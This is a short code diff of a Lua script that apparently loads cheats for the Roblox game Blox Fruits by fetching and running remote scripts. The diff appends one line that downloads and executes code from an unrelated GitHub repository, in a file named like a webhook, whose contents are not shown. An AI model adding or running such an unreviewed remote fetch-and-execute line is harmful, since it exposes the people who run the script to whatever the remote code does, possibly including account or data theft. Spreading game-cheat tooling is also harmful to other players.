@@ -10,3 +10,4 @@ elseif lang == "th" then
 else 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/alchemy.scripts/main/BloxFruitsRewrite/EN.lua"))()
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenhubtop/zen_hub_pr/main/Zwebgoook.lua"))()
